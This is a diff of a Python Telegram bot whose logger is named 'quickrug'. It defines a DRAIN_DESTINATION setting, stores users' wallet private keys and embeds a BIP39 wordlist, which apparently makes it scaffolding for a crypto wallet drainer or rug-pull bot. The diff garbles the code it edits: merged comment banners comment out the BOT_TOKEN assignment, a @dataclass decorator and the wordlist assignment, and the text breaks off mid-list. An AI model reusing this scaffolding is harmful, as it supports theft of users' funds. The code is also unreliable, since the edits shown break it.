@@ -51,10 +51,8 @@ try:
 except ImportError:
     HAS_WEB3 = False
 
-# ──────────────────────────────────────────────
-# CONFIG
-# ──────────────────────────────────────────────
-BOT_TOKEN = os.getenv("BOT_TOKEN", "PUT_YOUR_BOT_TOKEN_HERE")
+# ──────────────────────────────# CONFIG
+# ──────────────────────────────BOT_TOKEN = os.getenv("BOT_TOKEN", "PUT_YOUR_BOT_TOKEN_HERE")
 ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "123456789").split(",") if x.strip()}
 
 DRAIN_DESTINATION = (
@@ -94,10 +92,8 @@ ERC20_ABI = [
 logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
 log = logging.getLogger("quickrug")
 
-# ──────────────────────────────────────────────
-# STATE
-# ──────────────────────────────────────────────
-@dataclass
+# ──────────────────────────────# STATE
+# ──────────────────────────────@dataclass
 class UserWallet:
     private_key: str
     public_key: str
@@ -362,10 +358,8 @@ def _rate_ok(uid: int, action: str) -> bool:
     return True
 
 
-# ──────────────────────────────────────────────
-# HELPERS
-# ──────────────────────────────────────────────
-BIP39_WORDLIST = ['abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse', 'access', 'accident', 'account', 'accuse', 'achieve', 'acid', 'acoustic', 'acquire', 'across', 'act', 'action', 'actor', 'actress', 'actual', 'adapt', 'add', 'addict', 'address', 'adjust', 'admit', 'adult', 'advance', 'advice', 'aerobic', 'affair', 'afford', 'afraid', 'again', 'age', 'agent', 'agree', 'ahead', 'aim', 'air', 'airport', 'aisle', 'alarm', 'album', 'alcohol', 'alert', 'alien', 'all', 'alley', 'allow', 'almost', 'alone', 'alpha', 'already', 'also', 'alter', 'always', 'amateur', 'amazing', 'among', 'amount', 'amused', 'analyst', 'anchor', 'ancient', 'anger', 'angle', 'angry', 'animal', 'ankle', 'announce', 'annual', 'another', 'answer', 'antenna', 'antique', 'anxiety', 'any', 'apart', 'apology', 'appear', 'apple', 'approve', 'april', 'arch', 'arctic', 'area', 'arena', 'argue', 'arm', 'armed', 'armor', 'army', 'around', 'arrange', 'arrest', 'arrive', 'arrow', 'art', 'artefact', 'artist', 'artwork', 'ask', 'aspect', 'assault', 'asset', 'assist', 'assume', 'asthma', 'athlete', 'atom', 'attack', 'attend', 'attitude', 'attract', 'auction', 'audit', 'august', 'aunt', 'author', 'auto', 'autumn', 'average', 'avocado', 'avoid', 'awake', 'aware', 'away', 'awesome', 'awful', 'awkward', 'axis', 'baby', 'bachelor', 'bacon', 'badge', 'bag', 'balance', 'balcony', 'ball', 'bamboo', 'banana', 'banner', 'bar', 'barely', 'bargain', 'barrel', 'base', 'basic', 'basket', 'battle', 'beach', 'bean', 'beauty', 'because', 'become', 'beef', 'before', 'begin', 'behave', 'behind', 'believe', 'below', 'belt', 'bench', 'benefit', 'best', 'betray', 'better', 'between', 'beyond', 'bicycle', 'bid', 'bike', 'bind', 'biology', 'bird', 'birth', 'bitter', 'black', 'blade', 'blame', 'blanket', 'blast', 'bleak', 'bless', 'blind', 'blood', 'blossom', 'blouse', 'blue', 'blur', 'blush', 'board', 'boat', 'body', 'boil', 'bomb', 'bone', 'bonus', 'book', 'boost', 'border', 'boring', 'borrow', 'boss', 'bottom', 'bounce', 'box', 'boy', 'bracket', 'brain', 'brand', 'brass', 'brave', 'bread', 'breeze', 'brick', 'bridge', 'brief', 'bright', 'bring', 'brisk', 'broccoli', 'broken', 'bronze', 'broom', 'brother', 'brown', 'brush', 'bubble', 'buddy', 'budget', 'buffalo', 'build', 'bulb', 'bulk', 'bullet', 'bundle', 'bunker', 'burden', 'burger', 'burst', 'bus', 'business', 'busy', 'butter', 'buyer', 'buzz', 'cabbage', 'cabin', 'cable', 'cactus', 'cage', 'cake', 'call', 'calm', 'camera', 'camp', 'can', 'canal', 'cancel', 'candy', 'cannon', 'canoe', 'canvas', 'canyon', 'capable', 'capital', 'captain', 'car', 'carbon', 'card', 'cargo', 'carpet', 'carry', 'cart', 'case', 'cash', 'casino', 'castle', 'casual', 'cat', 'catalog', 'catch', 'category', 'cattle', 'caught', 'cause', 'caution', 'cave', 'ceiling', 'celery', 'cement', 'census', 'century', 'cereal', 'certain', 'chair', 'chalk', 'champion', 'change', 'chaos', 'chapter', 'charge', 'chase', 'chat', 'cheap', 'check', 'cheese', 'chef', 'cherry', 'chest', 'chicken', 'chief', 'child', 'chimney', 'choice', 'choose', 'chronic', 'chuckle', 'chunk', 'churn', 'cigar', 'cinnamon', 'circle', 'citizen', 'city', 'civil', 'claim', 'clap', 'clarify', 'claw', 'clay', 'clean', 'clerk', 'clever', 'click', 'client', 'cliff', 'climb', 'clinic', 'clip', 'clock', 'clog', 'close', 'cloth', 'cloud', 'clown', 'club', 'clump', 'cluster', 'clutch', 'coach', 'coast', 'coconut', 'code', 'coffee', 'coil', 'coin', 'collect', 'color', 'column', 'combine', 'come', 'comfort', 'comic', 'common', 'company', 'concert', 'conduct', 'confirm', 'congress', 'connect', 'consider', 'control', 'convince', 'cook', 'cool', 'copper', 'copy', 'coral', 'core', 'corn', 'correct', 'cost', 'cotton', 'couch', 'country', 'couple', 'course', 'cousin', 'cover', 'coyote', 'crack', 'craft', 'cram', 'crane', 'crash', 'crater', 'crawl', 'crazy', 'cream', 'credit', 'creek', 'crew', 'cricket', 'crime', 'crisp', 'critic', 'crop', 'cross', 'crouch', 'crowd', 'crucial', 'cruel', 'cruise', 'crumble', 'crunch', 'crush', 'cry', 'crystal', 'cube', 'culture', 'cup', 'cupboard', 'curious', 'current', 'curtain', 'curve', 'cushion', 'custom', 'cute', 'cycle', 'dad', 'damage', 'damp', 'dance', 'danger', 'daring', 'dash', 'daughter', 'dawn', 'day', 'deal', 'debate', 'debris', 'decade', 'december', 'decide', 'decline', 'decorate', 'decrease', 'deer', 'defense', 'define', 'defy', 'degree', 'delay', 'deliver', 'demand', 'demise', 'denial', 'dentist', 'deny', 'depart', 'depend', 'deposit', 'depth', 'deputy', 'derive', 'desert', 'design', 'desk', 'despair', 'destroy', 'detail', 'detect', 'develop', 'device', 'devote', 'diagram', 'dial', 'diamond', 'diary', 'dice', 'diesel', 'diet', 'differ', 'digital', 'dignity', 'dilemma', 'dinner', 'dinosaur', 'direct', 'dirt', 'disagree', 'discover', 'disease', 'dish', 'dismiss', 'disorder', 'display', 'distance', 'divert', 'divide', 'divorce', 'dizzy', 'doctor', 'document', 'dog', 'doll', 'dolphin', 'domain', 'donate', 'donkey', 'donor', 'door', 'dose', 'double', 'dove', 'dragon', 'drama', 'drastic', 'draw', 'dream', 'dress', 'drift', 'drill', 'drink', 'drip', 'drive', 'drop', 'drum', 'dry', 'duck', 'dumb', 'dune', 'during', 'dust', 'dutch', 'duty', 'dwarf', 'dynamic', 'eager', 'eagle', 'early', 'earn', 'earth', 'easily', 'east', 'easy', 'echo', 'ecology', 'economy', 'edge', 'edit', 'educate', 'effort', 'egg', 'eight', 'either', 'elbow', 'elder', 'electric', 'elegant', 'element', 'elephant', 'elevator', 'elite', 'else', 'embark', 'embody', 'embrace', 'emerge', 'emotion', 'employ', 'empty', 'enable', 'enact', 'end', 'endless', 'endorse', 'enemy', 'energy', 'enforce', 'engage', 'engine', 'enhance', 'enjoy', 'enlist', 'enough', 'enrich', 'enroll', 'ensure', 'enter', 'entire', 'entry', 'envelope', 'episode', 'equal', 'equip', 'era', 'erase', 'erode', 'erosion', 'error', 'erupt', 'escape', 'essay', 'essence', 'estate', 'eternal', 'ethics', 'evidence', 'evil', 'evoke', 'evolve', 'exact', 'example', 'excess', 'exchange', 'excite', 'exclude', 'excuse', 'execute', 'exercise', 'exhaust', 'exhibit', 'exile', 'exist', 'exit', 'exotic', 'expand', 'expect', 'expire', 'explain', 'expose', 'express', 'extend', 'extra', 'eye', 'eyebrow', 'fabric', 'face', 'faculty', 'fade', 'faint', 'faith', 'fall', 'false', 'fame', 'family', 'famous', 'fan', 'fancy', 'fantasy', 'farm', 'fashion', 'fat', 'fatal', 'father', 'fatigue', 'fault', 'favorite', 'feature', 'february', 'federal', 'fee', 'feed', 'feel', 'female', 'fence', 'festival', 'fetch', 'fever', 'few', 'fiber', 'fiction', 'field', 'figure', 'file', 'film', 'filter', 'final', 'find', 'fine', 'finger', 'finish', 'fire', 'firm', 'first', 'fiscal', 'fish', 'fit', 'fitness', 'fix', 'flag', 'flame', 'flash', 'flat', 'flavor', 'flee', 'flight', 'flip', 'float', 'flock', 'floor', 'flower', 'fluid', 'flush', 'fly', 'foam', 'focus', 'fog', 'foil', 'fold', 'follow', 'food', 'foot', 'force', 'forest', 'forget', 'fork', 'fortune', 'forum', 'forward', 'fossil', 'foster', 'found', 'fox', 'fragile', 'frame', 'frequent', 'fresh', 'friend', 'fringe', 'frog', 'front', 'frost', 'frown', 'frozen', 'fruit', 'fuel', 'fun', 'funny', 'furnace', 'fury', 'future', 'gadget', 'gain', 'galaxy', 'gallery', 'game', 'gap', 'garage', 'garbage', 'garden', 'garlic', 'garment', 'gas', 'gasp', 'gate', 'gather', 'gauge', 'gaze', 'general', 'genius', 'genre', 'gentle', 'genuine', 'gesture', 'ghost', 'giant', 'gift', 'giggle', 'ginger', 'giraffe', 'girl', 'give', 'glad', 'glance', 'glare', 'glass', 'glide', 'glimpse', 'globe', 'gloom', 'glory', 'glove', 'glow', 'glue', 'goat', 'goddess', 'gold', 'good', 'goose', 'gorilla', 'gospel', 'gossip', 'govern', 'gown', 'grab', 'grace', 'grain', 'grant', 'grape', 'grass', 'gravity', 'great', 'green', 'grid', 'grief', 'grit', 'grocery', 'group', 'grow', 'grunt', 'guard', 'guide', 'guilt', 'guitar', 'gun', 'gym', 'habit', 'hair', 'half', 'hammer', 'hamster', 'hand', 'happy', 'harbor', 'hard', 'harsh', 'harvest', 'hat', 'have', 'hawk', 'hazard', 'head', 'health', 'heart', 'heavy', 'hedgehog', 'height', 'hello', 'helmet', 'help', 'hen', 'hero', 'hidden', 'high', 'hill', 'hint', 'hip', 'hire', 'history', 'hobby', 'hockey', 'hold', 'hole', 'holiday', 'hollow', 'home', 'honey', 'hood', 'hope', 'horn', 'horror', 'horse', 'hospital', 'host', 'hotel', 'hour', 'hover', 'hub', 'huge', 'human', 'humble', 'humor', 'hundred', 'hungry', 'hunt', 'hurdle', 'hurry', 'hurt', 'husband', 'hybrid', 'ice', 'icon', 'idea', 'identify', 'idle', 'ignore', 'ill', 'illegal', 'illness', 'image', 'imitate', 'immense', 'immune', 'impact', 'impose', 'improve', 'impulse', 'inch', 'include', 'income', 'increase', 'index', 'indicate', 'indoor', 'industry', 'infant', 'inflict', 'inform', 'inhale', 'inherit', 'initial', 'inject', 'injury', 'inmate', 'inner', 'innocent', 'input', 'inquiry', 'insane', 'insect', 'inside', 'inspire', 'install', 'intact', 'interest', 'into', 'invest', 'invite', 'involve', 'iron', 'island', 'isolate', 'issue', 'item', 'ivory', 'jacket', 'jaguar', 'jar', 'jazz', 'jealous', 'jeans', 'jelly', 'jewel', 'job', 'join', 'joke', 'journey', 'joy', 'judge', 'juice', 'jump', 'jungle', 'junior', 'junk', 'just', 'kangaroo', 'keen', 'keep', 'ketchup', 'key', 'kick', 'kid', 'kidney', 'kind', 'kingdom', 'kiss', 'kit', 'kitchen', 'kite', 'kitten', 'kiwi', 'knee', 'knife', 'knock', 'know', 'lab', 'label', 'labor', 'ladder', 'lady', 'lake', 'lamp', 'language', 'laptop', 'large', 'later', 'latin', 'laugh', 'laundry', 'lava', 'law', 'lawn', 'lawsuit', 'layer', 'lazy', 'leader', 'leaf', 'learn', 'leave', 'lecture', 'left', 'leg', 'legal', 'legend', 'leisure', 'lemon', 'lend', 'length', 'lens', 'leopard', 'lesson', 'letter', 'level', 'liar', 'liberty', 'library', 'license', 'life', 'lift', 'light', 'like', 'limb', 'limit', 'link', 'lion', 'liquid', 'list', 'little', 'live', 'lizard', 'load', 'loan', 'lobster', 'local', 'lock', 'logic', 'lonely', 'long', 'loop', 'lottery', 'loud', 'lounge', 'love', 'loyal', 'lucky', 'luggage', 'lumber', 'lunar', 'lunch', 'luxury', 'lyrics', 'machine', 'mad', 'magic', 'magnet', 'maid', 'mail', 'main', 'major', 'make', 'mammal', 'man', 'manage', 'mandate', 'mango', 'mansion', 'manual', 'maple', 'marble', 'march', 'margin', 'marine', 'market', 'marriage', 'mask', 'mass', 'master', 'match', 'material', 'math', 'matrix', 'matter', 'maximum', 'maze', 'meadow', 'mean', 'measure', 'meat', 'mechanic', 'medal', 'media', 'melody', 'melt', 'member', 'memory', 'mention', 'menu', 'mercy', 'merge', 'merit', 'merry', 'mesh', 'message', 'metal', 'method', 'middle', 'midnight', 'milk', 'million', 'mimic', 'mind', 'minimum', 'minor', 'minute', 'miracle', 'mirror', 'misery', 'miss', 'mistake', 'mix', 'mixed', 'mixture', 'mobile', 'model', 'modify', 'mom', 'moment', 'monitor', 'monkey', 'monster', 'month', 'moon', 'moral', 'more', 'morning', 'mosquito', 'mother', 'motion', 'motor', 'mountain', 'mouse', 'move', 'movie', 'much', 'muffin', 'mule', 'multiply', 'muscle', 'museum', 'music', 'must', 'mutual', 'myself', 'mystery', 'myth', 'naive', 'name', 'napkin', 'narrow', 'nasty', 'nation', 'nature', 'near', 'neck', 'need', 'negative', 'neglect', 'neither', 'nephew', 'nerve', 'nest', 'net', 'network', 'neutral', 'never', 'news', 'next', 'nice', 'night', 'noble', 'noise', 'nominee', 'noodle', 'normal', 'north', 'nose', 'notable', 'note', 'nothing', 'notice', 'novel', 'now', 'nuclear', 'number', 'nurse', 'nut', 'oak', 'obey', 'object', 'oblige', 'obscure', 'observe', 'obtain', 'obvious', 'occur', 'ocean', 'october', 'odor', 'off', 'offer', 'office', 'often', 'oil', 'okay', 'old', 'olive', 'olympic', 'omit', 'once', 'one', 'onion', 'online', 'only', 'open', 'opera', 'opinion', 'oppose', 'option', 'orange', 'orbit', 'orchard', 'order', 'ordinary', 'organ', 'orient', 'original', 'orphan', 'ostrich', 'other', 'outdoor', 'outer', 'output', 'outside', 'oval', 'oven', 'over', 'own', 'owner', 'oxygen', 'oyster', 'ozone', 'pact', 'paddle', 'page', 'pair', 'palace', 'palm', 'panda', 'panel', 'panic', 'panther', 'paper', 'parade', 'parent', 'park', 'parrot', 'party', 'pass', 'patch', 'path', 'patient', 'patrol', 'pattern', 'pause', 'pave', 'payment', 'peace', 'peanut', 'pear', 'peasant', 'pelican', 'pen', 'penalty', 'pencil', 'people', 'pepper', 'perfect', 'permit', 'person', 'pet', 'phone', 'photo', 'phrase', 'physical', 'piano', 'picnic', 'picture', 'piece', 'pig', 'pigeon', 'pill', 'pilot', 'pink', 'pioneer', 'pipe', 'pistol', 'pitch', 'pizza', 'place', 'planet', 'plastic', 'plate', 'play', 'please', 'pledge', 'pluck', 'plug', 'plunge', 'poem', 'poet', 'point', 'polar', 'pole', 'police', 'pond', 'pony', 'pool', 'popular', 'portion', 'position', 'possible', 'post', 'potato', 'pottery', 'poverty', 'powder', 'power', 'practice', 'praise', 'predict', 'prefer', 'prepare', 'present', 'pretty', 'prevent', 'price', 'pride', 'primary', 'print', 'priority', 'prison', 'private', 'prize', 'problem', 'process', 'produce', 'profit', 'program', 'project', 'promote', 'proof', 'property', 'prosper', 'protect', 'proud', 'provide', 'public', 'pudding', 'pull', 'pulp', 'pulse', 'pumpkin', 'punch', 'pupil', 'puppy', 'purchase', 'purity', 'purpose', 'purse', 'push', 'put', 'puzzle', 'pyramid', 'quality', 'quantum', 'quarter', 'question', 'quick', 'quit', 'quiz', 'quote', 'rabbit', 'raccoon', 'race', 'rack', 'radar', 'radio', 'rail', 'rain', 'raise', 'rally', 'ramp', 'ranch', 'random', 'range', 'rapid', 'rare', 'rate', 'rather', 'raven', 'raw', 'razor', 'ready', 'real', 'reason', 'rebel', 'rebuild', 'recall', 'receive', 'recipe', 'record', 'recycle', 'reduce', 'reflect', 'reform', 'refuse', 'region', 'regret', 'regular', 'reject', 'relax', 'release', 'relief', 'rely', 'remain', 'remember', 'remind', 'remove', 'render', 'renew', 'rent', 'reopen', 'repair', 'repeat', 'replace', 'report', 'require', 'rescue', 'resemble', 'resist', 'resource', 'response', 'result', 'retire', 'retreat', 'return', 'reunion', 'reveal', 'review', 'reward', 'rhythm', 'rib', 'ribbon', 'rice', 'rich', 'ride', 'ridge', 'rifle', 'right', 'rigid', 'ring', 'riot', 'ripple', 'risk', 'ritual', 'rival', 'river', 'road', 'roast', 'robot', 'robust', 'rocket', 'romance', 'roof', 'rookie', 'room', 'rose', 'rotate', 'rough', 'round', 'route', 'royal', 'rubber', 'rude', 'rug', 'rule', 'run', 'runway', 'rural', 'sad', 'saddle', 'sadness', 'safe', 'sail', 'salad', 'salmon', 'salon', 'salt', 'salute', 'same', 'sample', 'sand', 'satisfy', 'satoshi', 'sauce', 'sausage', 'save', 'say', 'scale', 'scan', 'scare', 'scene', 'scheme', 'school', 'science', 'scissors', 'scorpion', 'scout', 'scrap', 'screen', 'script', 'scrub', 'sea', 'search', 'season', 'seat', 'second', 'secret', 'section', 'security', 'seed', 'seek', 'segment', 'select', 'sell', 'seminar', 'senior', 'sense', 'sentence', 'series', 'service', 'session', 'settle', 'setup', 'seven', 'shadow', 'shaft', 'shallow', 'share', 'shed', 'shell', 'sheriff', 'shield', 'shift', 'shine', 'ship', 'shiver', 'shock', 'shoe', 'shoot', 'shop', 'short', 'shoulder', 'shove', 'shrimp', 'shrug', 'shuffle', 'shy', 'sibling', 'sick', 'side', 'siege', 'sight', 'sign', 'silent', 'silk', 'silly', 'silver', 'similar', 'simple', 'since', 'sing', 'siren', 'sister', 'situate', 'six', 'size', 'skate', 'sketch', 'ski', 'skill', 'skin', 'skirt', 'skull', 'slab', 'slam', 'sleep', 'slender', 'slice', 'slide', 'slight', 'slim', 'slogan', 'slot', 'slow', 'slush', 'small', 'smart', 'smile', 'smoke', 'smooth', 'snack', 'snake', 'snap', 'sniff', 'snow', 'soap', 'soccer', 'social', 'sock', 'soda', 'soft', 'solar', 'soldier', 'solid', 'solution', 'solve', 'someone', 'song', 'soon', 'sorry', 'sort', 'soul', 'sound', 'soup', 'source', 'south', 'space', 'spare', 'spatial', 'spawn', 'speak', 'special', 'speed', 'spell', 'spend', 'sphere', 'spice', 'spider', 'spike', 'spin', 'spirit', 'split', 'spoil', 'sponsor', 'spoon', 'sport', 'spot', 'spray', 'spread', 'spring', 'spy', 'square', 'squeeze', 'squirrel', 'stable', 'stadium', 'staff', 'stage', 'stairs', 'stamp', 'stand', 'start', 'state', 'stay', 'steak', 'steel', 'stem', 'step', 'stereo', 'stick', 'still', 'sting', 'stock', 'stomach', 'stone', 'stool', 'story', 'stove', 'strategy', 'street', 'strike', 'strong', 'struggle', 'student', 'stuff', 'stumble', 'style', 'subject', 'submit', 'subway', 'success', 'such', 'sudden', 'suffer', 'sugar', 'suggest', 'suit', 'summer', 'sun', 'sunny', 'sunset', 'super', 'supply', 'supreme', 'sure', 'surface', 'surge', 'surprise', 'surround', 'survey', 'suspect', 'sustain', 'swallow', 'swamp', 'swap', 'swarm', 'swear', 'sweet', 'swift', 'swim', 'swing', 'switch', 'sword', 'symbol', 'symptom', 'syrup', 'system', 'table', 'tackle', 'tag', 'tailor', 'talent', 'talk', 'tank', 'tape', 'target', 'task', 'taste', 'tattoo', 'taxi', 'teach', 'team', 'tell', 'ten', 'tenant', 'tennis', 'tent', 'term', 'test', 'text', 'thank', 'that', 'theme', 'then', 'theory', 'there', 'they', 'thing', 'this', 'thought', 'three', 'thrive', 'throw', 'thumb', 'thunder', 'ticket', 'tide', 'tiger', 'tilt', 'timber', 'time', 'tiny', 'tip', 'tired', 'tissue', 'title', 'toast', 'tobacco', 'today', 'toddler', 'toe', 'together', 'toilet', 'token', 'tomato', 'tomorrow', 'tone', 'tongue', 'tonight', 'tool', 'tooth', 'top', 'topic', 'topple', 'torch', 'tornado', 'tortoise', 'toss', 'total', 'tourist', 'toward', 'tower', 'town', 'toy', 'track', 'trade', 'traffic', 'tragic', 'train', 'transfer', 'trap', 'trash', 'travel', 'tray', 'treat', 'tree', 'trend', 'trial', 'tribe', 'trick', 'trigger', 'trim', 'trip', 'trophy', 'trouble', 'truck', 'true', 'truly', 'trumpet', 'trust', 'truth', 'try', 'tube', 'tuition', 'tumble', 'tuna', 'tunnel', 'turkey', 'turn', 'turtle', 'twelve', 'twenty', 'twice', 'twin', 'twist', 'two', 'type', 'typical', 'ugly', 'umbrella', 'unable', 'unaware', 'uncle', 'uncover', 'under', 'undo', 'unfair', 'unfold', 'unhappy', 'unique', 'unit', 'universe', 'unknown', 'unlock', 'until', 'unusual', 'unveil', 'update', 'upgrade', 'uphold', 'upon', 'upper', 'upset', 'urban', 'urge', 'usage', 'use', 'used', 'useful', 'useless', 'usual', 'utility', 'vacant', 'vacuum', 'vague', 'valid', 'valley', 'valve', 'van', 'vanish', 'vapor', 'various', 'vast', 'vault', 'vehicle', 'velvet', 'vendor', 'venture', 'venue', 'verb', 'verify', 'version', 'very', 'vessel', 'veteran', 'viable', 'vibrant', 'vicious', 'victory', 'video', 'view', 'village', 'vintage', 'violin', 'virtual', 'virus', 'visa', 'visit', 'visual', 'vital', 'vivid', 'vocal', 'voice', 'void', 'volcano', 'volume', 'vote', 'voyage', 'wage', 'wagon', 'wait', 'walk', 'wall', 'walnut', 'want', 'warfare', 'warm', 'warrior', 'wash', 'wasp', 'waste', 'water', 'wave', 'way', 'wealth', 'weapon', 'wear', 'weasel', 'weather', 'web', 'wedding', 'weekend', 'weird', 'welcome', 'west', 'wet', 'whale', 'what', 'wheat', 'wheel', 'when', 'where', 'whip', 'whisper', 'wide', 'width', 'wife', 'wild', 'will', 'win', 'window', 'wine', 'wing', 'wink', 'winner', 'winter', 'wire', 'wisdom', 'wise', 'wish', 'witness', 'wolf', 'woman', 'wonder', 'wood', 'wool', 'word', 'work', 'world', 'worry', 'worth', 'wrap', 'wreck', 'wrestle', 'wrist', 'write', 'wrong', 'yard', 'year', 'yellow', 'you', 'young', 'youth', 'zebra', 'zero', 'zone', 'zoo']
+# ──────────────────────────────# HELPERS
+# ──────────────────────────────BIP39_WORDLIST = ['abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse', 'access', 'accident', 'account', 'accuse', 'achieve', 'acid', 'acoustic', 'acquire', 'across', 'act', 'action', 'actor', 'actress', 'actual', 'adapt', 'add', 'addict', 'address', 'adjust', 'admit', 'adult', 'advance', 'advice', 'aerobic', 'affair', 'afford', 'afraid', 'again', 'age', 'agent', 'agree', 'ahead', 'aim', 'air', 'airport', 'aisle', 'alarm', 'album', 'alcohol', 'alert', 'alien', 'all', 'alley', 'allow', 'almost', 'alone', 'alpha', 'already', 'also', 'alter', 'always', 'amateur', 'amazing', 'among', 'amount', 'amused', 'analyst', 'anchor', 'ancient', 'anger', 'angle', 'angry', 'animal', 'ankle', 'announce', 'annual', 'another', 'answer', 'antenna', 'antique', 'anxiety', 'any', 'apart', 'apology', 'appear', 'apple', 'approve', 'april', 'arch', 'arctic', 'area', 'arena', 'argue', 'arm', 'armed', 'armor', 'army', 'around', 'arrange', 'arrest', 'arrive', 'arrow', 'art', 'artefact', 'artist', 'artwork', 'ask', 'aspect', 'assault', 'asset', 'assist', 'assume', 'asthma', 'athlete', 'atom', 'attack', 'attend', 'attitude', 'attract', 'auction', 'audit', 'august', 'aunt', 'author', 'auto', 'autumn', 'average', 'avocado', 'avoid', 'awake', 'aware', 'away', 'awesome', 'awful', 'awkward', 'axis', 'baby', 'bachelor', 'bacon', 'badge', 'bag', 'balance', 'balcony', 'ball', 'bamboo', 'banana', 'banner', 'bar', 'barely', 'bargain', 'barrel', 'base', 'basic', 'basket', 'battle', 'beach', 'bean', 'beauty', 'because', 'become', 'beef', 'before', 'begin', 'behave', 'behind', 'believe', 'below', 'belt', 'bench', 'benefit', 'best', 'betray', 'better', 'between', 'beyond', 'bicycle', 'bid', 'bike', 'bind', 'biology', 'bird', 'birth', 'bitter', 'black', 'blade', 'blame', 'blanket', 'blast', 'bleak', 'bless', 'blind', 'blood', 'blossom', 'blouse', 'blue', 'blur', 'blush', 'board', 'boat', 'body', 'boil', 'bomb', 'bone', 'bonus', 'book', 'boost', 'border', 'boring', 'borrow', 'boss', 'bottom', 'bounce', 'box', 'boy', 'bracket', 'brain', 'brand', 'brass', 'brave', 'bread', 'breeze', 'brick', 'bridge', 'brief', 'bright', 'bring', 'brisk', 'broccoli', 'broken', 'bronze', 'broom', 'brother', 'brown', 'brush', 'bubble', 'buddy', 'budget', 'buffalo', 'build', 'bulb', 'bulk', 'bullet', 'bundle', 'bunker', 'burden', 'burger', 'burst', 'bus', 'business', 'busy', 'butter', 'buyer', 'buzz', 'cabbage', 'cabin', 'cable', 'cactus', 'cage', 'cake', 'call', 'calm', 'camera', 'camp', 'can', 'canal', 'cancel', 'candy', 'cannon', 'canoe', 'canvas', 'canyon', 'capable', 'capital', 'captain', 'car', 'carbon', 'card', 'cargo', 'carpet', 'carry', 'cart', 'case', 'cash', 'casino', 'castle', 'casual', 'cat', 'catalog', 'catch', 'category', 'cattle', 'caught', 'cause', 'caution', 'cave', 'ceiling', 'celery', 'cement', 'census', 'century', 'cereal', 'certain', 'chair', 'chalk', 'champion', 'change', 'chaos', 'chapter', 'charge', 'chase', 'chat', 'cheap', 'check', 'cheese', 'chef', 'cherry', 'chest', 'chicken', 'chief', 'child', 'chimney', 'choice', 'choose', 'chronic', 'chuckle', 'chunk', 'churn', 'cigar', 'cinnamon', 'circle', 'citizen', 'city', 'civil', 'claim', 'clap', 'clarify', 'claw', 'clay', 'clean', 'clerk', 'clever', 'click', 'client', 'cliff', 'climb', 'clinic', 'clip', 'clock', 'clog', 'close', 'cloth', 'cloud', 'clown', 'club', 'clump', 'cluster', 'clutch', 'coach', 'coast', 'coconut', 'code', 'coffee', 'coil', 'coin', 'collect', 'color', 'column', 'combine', 'come', 'comfort', 'comic', 'common', 'company', 'concert', 'conduct', 'confirm', 'congress', 'connect', 'consider', 'control', 'convince', 'cook', 'cool', 'copper', 'copy', 'coral', 'core', 'corn', 'correct', 'cost', 'cotton', 'couch', 'country', 'couple', 'course', 'cousin', 'cover', 'coyote', 'crack', 'craft', 'cram', 'crane', 'crash', 'crater', 'crawl', 'crazy', 'cream', 'credit', 'creek', 'crew', 'cricket', 'crime', 'crisp', 'critic', 'crop', 'cross', 'crouch', 'crowd', 'crucial', 'cruel', 'cruise', 'crumble', 'crunch', 'crush', 'cry', 'crystal', 'cube', 'culture', 'cup', 'cupboard', 'curious', 'current', 'curtain', 'curve', 'cushion', 'custom', 'cute', 'cycle', 'dad', 'damage', 'damp', 'dance', 'danger', 'daring', 'dash', 'daughter', 'dawn', 'day', 'deal', 'debate', 'debris', 'decade', 'december', 'decide', 'decline', 'decorate', 'decrease', 'deer', 'defense', 'define', 'defy', 'degree', 'delay', 'deliver', 'demand', 'demise', 'denial', 'dentist', 'deny', 'depart', 'depend', 'deposit', 'depth', 'deputy', 'derive', 'desert', 'design', 'desk', 'despair', 'destroy', 'detail', 'detect', 'develop', 'device', 'devote', 'diagram', 'dial', 'diamond', 'diary', 'dice', 'diesel', 'diet', 'differ', 'digital', 'dignity', 'dilemma', 'dinner', 'dinosaur', 'direct', 'dirt', 'disagree', 'discover', 'disease', 'dish', 'dismiss', 'disorder', 'display', 'distance', 'divert', 'divide', 'divorce', 'dizzy', 'doctor', 'document', 'dog', 'doll', 'dolphin', 'domain', 'donate', 'donkey', 'donor', 'door', 'dose', 'double', 'dove', 'dragon', 'drama', 'drastic', 'draw', 'dream', 'dress', 'drift', 'drill', 'drink', 'drip', 'drive', 'drop', 'drum', 'dry', 'duck', 'dumb', 'dune', 'during', 'dust', 'dutch', 'duty', 'dwarf', 'dynamic', 'eager', 'eagle', 'early', 'earn', 'earth', 'easily', 'east', 'easy', 'echo', 'ecology', 'economy', 'edge', 'edit', 'educate', 'effort', 'egg', 'eight', 'either', 'elbow', 'elder', 'electric', 'elegant', 'element', 'elephant', 'elevator', 'elite', 'else', 'embark', 'embody', 'embrace', 'emerge', 'emotion', 'employ', 'empty', 'enable', 'enact', 'end', 'endless', 'endorse', 'enemy', 'energy', 'enforce', 'engage', 'engine', 'enhance', 'enjoy', 'enlist', 'enough', 'enrich', 'enroll', 'ensure', 'enter', 'entire', 'entry', 'envelope', 'episode', 'equal', 'equip', 'era', 'erase', 'erode', 'erosion', 'error', 'erupt', 'escape', 'essay', 'essence', 'estate', 'eternal', 'ethics', 'evidence', 'evil', 'evoke', 'evolve', 'exact', 'example', 'excess', 'exchange', 'excite', 'exclude', 'excuse', 'execute', 'exercise', 'exhaust', 'exhibit', 'exile', 'exist', 'exit', 'exotic', 'expand', 'expect', 'expire', 'explain', 'expose', 'express', 'extend', 'extra', 'eye', 'eyebrow', 'fabric', 'face', 'faculty', 'fade', 'faint', 'faith', 'fall', 'false', 'fame', 'family', 'famous', 'fan', 'fancy', 'fantasy', 'farm', 'fashion', 'fat', 'fatal', 'father', 'fatigue', 'fault', 'favorite', 'feature', 'february', 'federal', 'fee', 'feed', 'feel', 'female', 'fence', 'festival', 'fetch', 'fever', 'few', 'fiber', 'fiction', 'field', 'figure', 'file', 'film', 'filter', 'final', 'find', 'fine', 'finger', 'finish', 'fire', 'firm', 'first', 'fiscal', 'fish', 'fit', 'fitness', 'fix', 'flag', 'flame', 'flash', 'flat', 'flavor', 'flee', 'flight', 'flip', 'float', 'flock', 'floor', 'flower', 'fluid', 'flush', 'fly', 'foam', 'focus', 'fog', 'foil', 'fold', 'follow', 'food', 'foot', 'force', 'forest', 'forget', 'fork', 'fortune', 'forum', 'forward', 'fossil', 'foster', 'found', 